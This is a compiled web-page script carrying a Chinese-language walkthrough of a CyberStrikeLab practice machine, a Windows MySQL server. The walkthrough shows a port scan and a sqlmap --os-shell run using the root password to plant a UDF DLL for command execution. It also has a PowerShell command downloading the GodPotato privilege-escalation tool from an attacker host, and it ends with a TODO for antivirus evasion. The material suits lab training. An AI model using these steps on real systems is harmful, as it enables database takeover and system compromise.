"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6228],{25456:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>_,frontMatter:()=>i,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"Independent-Environment/CyberStrikeLab/Simulation-Target/database-2/index","title":"database-2","description":"\u9776\u6807\u4ecb\u7ecd\uff1a","source":"@site/docs/Independent-Environment/CyberStrikeLab/Simulation-Target/database-2/index.md","sourceDirName":"Independent-Environment/CyberStrikeLab/Simulation-Target/database-2","slug":"/Independent-Environment/CyberStrikeLab/Simulation-Target/database-2/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Simulation-Target/database-2/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CyberStrikeLab/Simulation-Target/database-2/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"PT-03","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Simulation-Target/PT-03/"},"next":{"title":"DockerLabs","permalink":"/Target-Machines-WriteUp/docs/category/DockerLabs"}}');var a=r(74848),s=r(28453);const i={},o="database-2",l={},d=[{value:"\u5165\u53e3\u70b9",id:"\u5165\u53e3\u70b9",level:2}];function c(e){const n={admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"database-2",children:"database-2"})}),"\n",(0,a.jsxs)(n.admonition,{type:"info",children:[(0,a.jsx)(n.p,{children:"\u9776\u6807\u4ecb\u7ecd\uff1a"}),(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u9776\u673a\u662f\u6570\u636e\u5e93\uff0c\u60f3\u60f3\u529e\u6cd5\u62ff\u5230shell\u3002"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"database"}),"\n",(0,a.jsx)(n.li,{children:"mysql"}),"\n",(0,a.jsx)(n.li,{children:"evasion"}),"\n",(0,a.jsx)(n.li,{children:"udf"}),"\n"]}),"\n"]})]}),"\n",(0,a.jsx)(n.h2,{id:"\u5165\u53e3\u70b9",children:"\u5165\u53e3\u70b9"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"http://10.0.0.10/\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u9996\u5148\u5148\u626b\u63cf\u4e00\u4e0b\u7aef\u53e3"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ ./tools/fscan_1.8.4/fscan -h 10.0.0.10\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n10.0.0.10:139 open\n10.0.0.10:135 open\n10.0.0.10:3306 open\n10.0.0.10:445 open\n[*] alive ports len is: 4\nstart vulscan\n[*] NetInfo \n[*]10.0.0.10\n   [->]WIN-J2B9EIUKEN3\n   [->]10.0.0.10\n\u5df2\u5b8c\u6210 4/4\n[*] \u626b\u63cf\u7ed3\u675f,\u8017\u65f6: 39.987650807s\n"})}),"\n",(0,a.jsx)(n.p,{children:"Windows \u4e0a\u8fd0\u884c\u7684 Mysql \u6570\u636e\u5e93"}),"\n",(0,a.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u5c1d\u8bd5\u76f4\u63a5\u55e6\u4e00\u4e0b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ sqlmap -d mysql://root:cslab@10.0.0.10:3306/mysql --os-shell\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.9.8#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 21:40:23 /2025-11-04/\n\n[21:40:24] [INFO] connection to MySQL server '10.0.0.10:3306' established\n[21:40:24] [INFO] testing MySQL\n[21:40:24] [INFO] resumed: [['1']]...\n[21:40:24] [INFO] confirming MySQL\n[21:40:24] [INFO] resumed: [['1']]...\n[21:40:24] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0.0\n[21:40:24] [INFO] fingerprinting the back-end DBMS operating system\n[21:40:24] [INFO] resumed: [['1']]...\n[21:40:24] [INFO] the back-end DBMS operating system is Windows\n[21:40:24] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, \"Unknown table 'mysql.sqlmapfile'\")\n[21:40:24] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, \"Unknown table 'mysql.sqlmapfilehex'\")\n[21:40:24] [INFO] testing if current user is DBA\n[21:40:24] [INFO] fetching current user\n[21:40:24] [INFO] resumed: [['root@%']]...\n[21:40:24] [INFO] resumed: [['1']]...\nwhat is the back-end database management system architecture?\n[1] 32-bit (default)\n[2] 64-bit\n> 2\n[21:40:26] [INFO] checking if UDF 'sys_exec' already exist\n[21:40:27] [INFO] checking if UDF 'sys_eval' already exist\n[21:40:27] [INFO] detecting back-end DBMS version from its banner\n[21:40:27] [INFO] resumed: [['5.7.44-log']]...\n[21:40:27] [INFO] retrieving MySQL plugin directory absolute path\n[21:40:27] [INFO] resumed: [['C:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.7\\\\lib\\\\plugin\\\\']]...\n[21:40:27] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, \"Unknown table 'mysql.sqlmapfile'\")\n[21:40:32] [INFO] the local file '/tmp/sqlmap3rut9l3p153642/lib_mysqludf_sysnlgol0g0.dll' and the remote file 'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin/libsqahk.dll' have the same size (7168 B)\n[21:40:33] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, \"Unknown table 'mysql.sqlmapfilehex'\")\n[21:40:33] [INFO] creating UDF 'sys_exec' from the binary UDF file\n[21:40:33] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1305, 'FUNCTION mysql.sys_exec does not exist')\n[21:40:33] [INFO] creating UDF 'sys_eval' from the binary UDF file\n[21:40:33] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1305, 'FUNCTION mysql.sys_eval does not exist')\n[21:40:34] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, \"Unknown table 'mysql.sqlmapoutput'\")\n[21:40:34] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution\n[21:40:34] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER\nos-shell> whoami\ndo you want to retrieve the command standard output? [Y/n/a] \n\n[21:40:40] [INFO] resumed: [['nt authority\\\\network service']]...\ncommand standard output:\n---\nnt authority\network service\n---\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6362\u4e00\u4e2a\uff0c\u4f7f\u7528 MDUT \u6210\u529f\u8fdb\u884c\u64cd\u4f5c"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:r(39991).A+"",width:"1507",height:"1283"})}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528 powershell \u5c06 GodPotato \u4f20\u8f93\u4e0a\u53bb"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-cmd",children:'powershell -Command "Invoke-WebRequest -Uri http://172.16.233.2/GodPotato-NET4.exe -OutFile GodPotato-NET4.exe"\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u5931\u8d25\u4e86\uff0c\u56e0\u4e3a\u73af\u5883\u4e2d\u5b58\u5728\u6709 Defender"}),"\n",(0,a.jsx)(n.p,{children:"TODO \u9700\u8981\u505a\u514d\u6740"})]})}function _(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(c,{...e})}):c(e)}},39991:(e,n,r)=>{r.d(n,{A:()=>t});const t=r.p+"assets/images/image_20251151-215130-3685c47ae1ad2bc5f2d409c0a4eb3213.png"},28453:(e,n,r)=>{r.d(n,{R:()=>i,x:()=>o});var t=r(96540);const a={},s=t.createContext(a);function i(e){const n=t.useContext(s);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),t.createElement(s.Provider,{value:n},e.children)}}}]);